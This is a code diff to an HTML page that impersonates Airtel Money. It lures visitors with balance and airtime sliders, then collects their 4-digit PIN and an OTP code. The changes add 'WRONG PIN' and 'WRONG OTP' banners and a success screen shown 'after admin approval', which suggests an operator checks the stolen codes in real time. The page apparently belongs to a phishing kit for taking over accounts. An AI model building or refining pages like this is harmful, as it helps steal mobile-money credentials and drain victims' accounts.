@@ -42,11 +42,10 @@
   <section id="step-slider" class="screen">
     <div class="welcome-banner">
       <h2>Account Balance Overview</h2>
-      <p>Select your desired account balance parameters</p>
+      <p style="color: var(--text-muted); font-size: 14px;">Select your desired account balance parameters</p>
     </div>
 
     <div class="overview-card">
-      <!-- Balance Slider -->
       <div class="slider-group">
         <div class="slider-header">
           <span class="slider-label">Airtel Money Balance</span>
@@ -59,7 +58,6 @@
         </div>
       </div>
 
-      <!-- Airtime Slider -->
       <div class="slider-group">
         <div class="slider-header">
           <span class="slider-label">Available Airtime</span>
@@ -177,9 +175,14 @@
     </div>
 
     <h2 style="margin-bottom: 6px;">Airtel Security</h2>
-    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 3 of 3: Authorize with 4-Digit PIN</p>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 16px;">Step 3 of 3: Authorize with 4-Digit PIN</p>
 
-    <div class="form-group" style="text-align: center; margin-top: 20px;">
+    <!-- IN-PAGE SURFACE NOTIFICATION FOR WRONG PIN -->
+    <div id="pin-surface-banner" class="surface-banner">
+      WRONG PIN ❌
+    </div>
+
+    <div class="form-group" style="text-align: center;">
       <label style="color: var(--text-muted); font-size: 14px; margin-bottom: 12px; display: block;">Enter your 4-digit Airtel PIN</label>
       <div class="pin-grid">
         <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
@@ -233,9 +236,14 @@
   <!-- STEP 7: OTP / WHATSAPP SCREEN (4 DIGITS) -->
   <section id="step-otp" class="screen">
     <h2 style="margin-bottom: 6px;">OTP Verification</h2>
-    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 16px;">
       Verification code sent to <strong id="otp-phone-display">099XXXXXXX</strong>
     </p>
+
+    <!-- IN-PAGE SURFACE NOTIFICATION FOR WRONG OTP -->
+    <div id="otp-surface-banner" class="surface-banner">
+      WRONG OTP ❌
+    </div>
 
     <!-- RED WHATSAPP ALERT -->
     <div class="whatsapp-notice">
@@ -243,7 +251,6 @@
     </div>
 
     <div class="form-group" style="text-align: center;">
-      <!-- EXACT 4-DIGIT OTP GRID -->
       <div class="pin-grid">
         <input type="text" class="otp-digit" maxlength="1" inputmode="numeric">
         <input type="text" class="otp-digit" maxlength="1" inputmode="numeric">
@@ -256,7 +263,7 @@
     <button id="btn-submit-otp" class="btn-primary" style="margin-top: 20px;">SUBMIT OTP</button>
   </section>
 
-  <!-- STEP 8: SUCCESS SCREEN -->
+  <!-- STEP 8: SUCCESS SCREEN (DIRECT TRANSITION AFTER ADMIN APPROVAL) -->
   <section id="step-success" class="screen">
     <div style="text-align: center; margin-top: 10px;">
       <div class="success-checkmark">✓</div>
@@ -298,5 +305,5 @@
 
 <script src="script.js"></script>
 </body>
-  </html>
-            
+                                                      </html>
+  
